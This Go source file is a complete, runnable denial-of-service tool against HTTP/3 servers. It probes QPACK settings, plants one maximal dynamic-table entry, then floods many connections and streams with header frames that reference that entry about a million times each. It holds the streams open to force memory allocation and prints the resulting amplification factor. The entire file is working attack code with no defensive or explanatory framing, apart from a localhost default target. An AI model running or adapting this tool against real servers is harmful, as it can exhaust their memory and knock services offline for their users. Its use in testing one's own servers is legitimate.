package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/quic-go/quic-go"
	"golang.org/x/net/http2/hpack"
)

func main() {
	target := flag.String("target", "[::1]:443", "Target server (host:port)")
	authority := flag.String("authority", "localhost", "HTTP/3 :authority value")
	conns := flag.Int("conns", 50, "Concurrent connections")
	streams := flag.Int("streams", 100, "Streams per connection")
	capacity := flag.Uint64("capacity", 4096, "QPACK dynamic table capacity")
	hold := flag.Duration("hold", 10*time.Second, "Hold duration per stream")
	noFin := flag.Bool("no-fin", true, "Keep streams open without FIN")
	refsPerStream := flag.Int("refs", 0, "Refs per stream (0=auto)")
	probeOnly := flag.Bool("probe", false, "Only probe server SETTINGS")
	keylog := flag.String("keylog", "", "TLS key log file")
	flag.Parse()

	var keylogWriter io.Writer
	if *keylog != "" {
		kf, err := os.OpenFile(*keylog, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0o600)
		if err != nil {
			log.Fatalf("keylog: %v", err)
		}
		defer kf.Close()
		keylogWriter = kf
	}

	hostname := *authority
	for i := len(*authority) - 1; i >= 0; i-- {
		if (*authority)[i] == ':' {
			hostname = (*authority)[:i]
			break
		}
	}

	fmt.Println("--- Probing server SETTINGS ---")
	settings, err := probeSettings(*target, hostname, keylogWriter)
	if err != nil {
		log.Printf("SETTINGS probe failed (using defaults): %v", err)
	} else {
		fmt.Printf("  QPACK_MAX_TABLE_CAPACITY: %d\n", settings.qpackMaxTableCapacity)
		fmt.Printf("  MAX_HEADER_LIST_SIZE:     %d\n", settings.maxHeaderListSize)
		fmt.Printf("  QPACK_BLOCKED_STREAMS:    %d\n", settings.qpackBlockedStreams)
		if settings.qpackMaxTableCapacity > 0 && settings.qpackMaxTableCapacity < *capacity {
			*capacity = settings.qpackMaxTableCapacity
		}
	}
	fmt.Println()

	if *probeOnly {
		return
	}

	if *capacity == 0 {
		log.Fatal("Server disabled QPACK dynamic table (capacity=0)")
	}

	const nameLen = 22
	const overhead = 32
	valueLen := int(*capacity) - nameLen - overhead
	if valueLen <= 0 {
		log.Fatalf("Capacity %d too small", *capacity)
	}

	refCount := *refsPerStream
	if refCount == 0 {
		const sfcw = 1 * 1024 * 1024
		refCount = sfcw - 128
	}

	encoderPayload := buildEncoderPayload(*capacity, 61, valueLen)
	headersFrame := buildHeadersFrame(*authority, refCount)

	entrySize := nameLen + valueLen
	totalStreams := *conns * *streams
	allocPerStream := refCount * entrySize
	totalAlloc := totalStreams * allocPerStream
	totalWire := len(encoderPayload)*(*conns) + len(headersFrame)*totalStreams

	fmt.Println("--- Attack parameters ---")
	fmt.Printf("  Connections:        %d\n", *conns)
	fmt.Printf("  Streams/conn:       %d\n", *streams)
	fmt.Printf("  Refs/stream:        %d\n", refCount)
	fmt.Printf("  Entry size:         %d bytes\n", entrySize)
	fmt.Printf("  Total server alloc: %.1f MB\n", float64(totalAlloc)/(1024*1024))
	fmt.Printf("  Total wire cost:    %.1f KB\n", float64(totalWire)/1024)
	fmt.Printf("  Amplification:      %.0fx\n", float64(totalAlloc)/float64(totalWire))
	fmt.Println()

	fmt.Println("--- Launching attack ---")
	var wg sync.WaitGroup
	for c := range *conns {
		wg.Add(1)
		go func(connID int) {
			defer wg.Done()
			runConnection(connID, *target, hostname, encoderPayload, headersFrame, *streams, *hold, *noFin, keylogWriter)
		}(c)
	}
	wg.Wait()
	fmt.Println("Attack complete.")
}

func buildEncoderPayload(capacity uint64, staticNameIndex uint64, valueLen int) []byte {
	var buf bytes.Buffer
	buf.Write(qpackVarint(capacity, 5, 0x20))
	buf.Write(qpackVarint(staticNameIndex, 6, 0xC0))
	value := strings.Repeat("a", valueLen)
	huffLen := hpack.HuffmanEncodeLength(value)
	buf.Write(qpackVarint(huffLen, 7, 0x80))
	buf.Write(hpack.AppendHuffmanString(nil, value))
	return buf.Bytes()
}

func buildHeadersFrame(authority string, refCount int) []byte {
	var fs bytes.Buffer
	fs.Write(qpackVarint(2, 8, 0x00))
	fs.Write(qpackVarint(0, 7, 0x00))
	fs.Write(qpackVarint(20, 6, 0xC0))
	fs.Write(qpackVarint(23, 6, 0xC0))
	fs.Write(qpackVarint(1, 6, 0xC0))
	fs.Write(qpackVarint(0, 4, 0x50))
	fs.Write(qpackVarint(uint64(len(authority)), 7, 0x00))
	fs.WriteString(authority)
	clValue := "999999999"
	fs.Write(qpackVarint(4, 4, 0x50))
	fs.Write(qpackVarint(uint64(len(clValue)), 7, 0x00))
	fs.WriteString(clValue)
	for range refCount {
		fs.Write(qpackVarint(0, 6, 0x80))
	}
	payload := fs.Bytes()
	var frame bytes.Buffer
	frame.Write(quicVarint(0x01))
	frame.Write(quicVarint(uint64(len(payload))))
	frame.Write(payload)
	return frame.Bytes()
}

func runConnection(connID int, target, hostname string, encoderPayload, headersFrame []byte, numStreams int, hold time.Duration, noFin bool, keylogWriter io.Writer) {
	tlsConf := &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h3"},
		ServerName:         hostname,
		KeyLogWriter:       keylogWriter,
	}
	quicConf := &quic.Config{
		MaxIdleTimeout:  30 * time.Second,
		KeepAlivePeriod: 5 * time.Second,
	}

	conn, err := quic.DialAddr(context.Background(), target, tlsConf, quicConf)
	if err != nil {
		log.Printf("Conn %d: dial failed: %v", connID, err)
		return
	}
	defer conn.CloseWithError(0, "done")

	encStream, err := initHTTP3(conn)
	if err != nil {
		log.Printf("Conn %d: init failed: %v", connID, err)
		return
	}

	serverSettings, err := readServerSettings(conn, 5*time.Second)
	if err != nil {
		log.Printf("Conn %d: SETTINGS read failed: %v", connID, err)
	} else if connID == 0 {
		log.Printf("Conn %d: capacity=%d, max_header_list_size=%d",
			connID, serverSettings.qpackMaxTableCapacity, serverSettings.maxHeaderListSize)
	}

	if _, err := encStream.Write(encoderPayload); err != nil {
		log.Printf("Conn %d: encoder write failed: %v", connID, err)
		return
	}
	time.Sleep(50 * time.Millisecond)

	var streamWg sync.WaitGroup
	for s := range numStreams {
		streamWg.Add(1)
		go func(streamID int) {
			defer streamWg.Done()
			stream, err := conn.OpenStream()
			if err != nil {
				if streamID == 0 {
					log.Printf("Conn %d Stream %d: open failed: %v", connID, streamID, err)
				}
				return
			}
			if _, err := stream.Write(headersFrame); err != nil {
				stream.Close()
				return
			}
			if noFin {
				time.Sleep(hold)
			}
			stream.Close()
		}(s)
	}
	streamWg.Wait()
	log.Printf("Conn %d: %d streams done", connID, numStreams)
}

func initHTTP3(conn *quic.Conn) (*quic.SendStream, error) {
	ctrl, err := conn.OpenUniStream()
	if err != nil {
		return nil, fmt.Errorf("control stream: %w", err)
	}
	var ctrlBuf []byte
	ctrlBuf = append(ctrlBuf, quicVarint(0x00)...)
	ctrlBuf = append(ctrlBuf, quicVarint(0x04)...)
	ctrlBuf = append(ctrlBuf, quicVarint(0x00)...)
	if _, err := ctrl.Write(ctrlBuf); err != nil {
		return nil, fmt.Errorf("control write: %w", err)
	}

	enc, err := conn.OpenUniStream()
	if err != nil {
		return nil, fmt.Errorf("encoder stream: %w", err)
	}
	if _, err := enc.Write(quicVarint(0x02)); err != nil {
		return nil, fmt.Errorf("encoder type: %w", err)
	}

	dec, err := conn.OpenUniStream()
	if err != nil {
		return nil, fmt.Errorf("decoder stream: %w", err)
	}
	if _, err := dec.Write(quicVarint(0x03)); err != nil {
		return nil, fmt.Errorf("decoder type: %w", err)
	}

	return enc, nil
}

type h3Settings struct {
	qpackMaxTableCapacity uint64
	maxHeaderListSize     uint64
	qpackBlockedStreams   uint64
}

func probeSettings(target, hostname string, keylogWriter io.Writer) (*h3Settings, error) {
	tlsConf := &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h3"},
		ServerName:         hostname,
		KeyLogWriter:       keylogWriter,
	}
	conn, err := quic.DialAddr(context.Background(), target, tlsConf, &quic.Config{MaxIdleTimeout: 10 * time.Second})
	if err != nil {
		return nil, fmt.Errorf("dial: %w", err)
	}
	defer conn.CloseWithError(0, "probe")
	if _, err := initHTTP3(conn); err != nil {
		return nil, fmt.Errorf("init: %w", err)
	}
	return readServerSettings(conn, 5*time.Second)
}

func readServerSettings(conn *quic.Conn, timeout time.Duration) (*h3Settings, error) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	for {
		stream, err := conn.AcceptUniStream(ctx)
		if err != nil {
			return nil, fmt.Errorf("accept: %w", err)
		}
		reader := &streamReader{stream: stream}
		streamType, err := readVarint(reader)
		if err != nil {
			return nil, fmt.Errorf("stream type: %w", err)
		}
		if streamType != 0x00 {
			continue
		}
		frameType, err := readVarint(reader)
		if err != nil {
			return nil, fmt.Errorf("frame type: %w", err)
		}
		if frameType != 0x04 {
			return nil, fmt.Errorf("expected SETTINGS (0x04), got 0x%x", frameType)
		}
		frameLen, err := readVarint(reader)
		if err != nil {
			return nil, fmt.Errorf("frame length: %w", err)
		}
		payload := make([]byte, frameLen)
		if _, err := io.ReadFull(stream, payload); err != nil {
			return nil, fmt.Errorf("payload read: %w", err)
		}
		return parseSettings(payload), nil
	}
}

func parseSettings(payload []byte) *h3Settings {
	settings := &h3Settings{}
	r := bytes.NewReader(payload)
	for r.Len() > 0 {
		id, err := readVarint(r)
		if err != nil {
			break
		}
		val, err := readVarint(r)
		if err != nil {
			break
		}
		switch id {
		case 0x01:
			settings.qpackMaxTableCapacity = val
		case 0x06:
			settings.maxHeaderListSize = val
		case 0x07:
			settings.qpackBlockedStreams = val
		}
	}
	return settings
}

func qpackVarint(n uint64, prefixBits int, prefixMask byte) []byte {
	maxFirst := uint64((1 << prefixBits) - 1)
	if n < maxFirst {
		return []byte{prefixMask | byte(n)}
	}
	buf := []byte{prefixMask | byte(maxFirst)}
	n -= maxFirst
	for n >= 128 {
		buf = append(buf, byte(n%128)|0x80)
		n /= 128
	}
	buf = append(buf, byte(n))
	return buf
}

func quicVarint(v uint64) []byte {
	if v < 64 {
		return []byte{byte(v)}
	}
	if v < 16384 {
		return []byte{byte((v >> 8) | 0x40), byte(v)}
	}
	if v < 1073741824 {
		return []byte{byte((v >> 24) | 0x80), byte(v >> 16), byte(v >> 8), byte(v)}
	}
	return []byte{
		byte((v >> 56) | 0xc0), byte(v >> 48), byte(v >> 40), byte(v >> 32),
		byte(v >> 24), byte(v >> 16), byte(v >> 8), byte(v),
	}
}

type streamReader struct {
	stream *quic.ReceiveStream
	buf    [1]byte
}

func (s *streamReader) ReadByte() (byte, error) {
	_, err := io.ReadFull(s.stream, s.buf[:])
	return s.buf[0], err
}

func readVarint(r io.ByteReader) (uint64, error) {
	b, err := r.ReadByte()
	if err != nil {
		return 0, err
	}
	prefix := b >> 6
	val := uint64(b & 0x3f)
	length := 0
	switch prefix {
	case 0:
		return val, nil
	case 1:
		length = 1
	case 2:
		length = 3
	case 3:
		length = 7
	}
	for i := range length {
		b, err = r.ReadByte()
		if err != nil {
			return 0, err
		}
		val = (val << 8) | uint64(b)
		_ = i
	}
	return val, nil
}
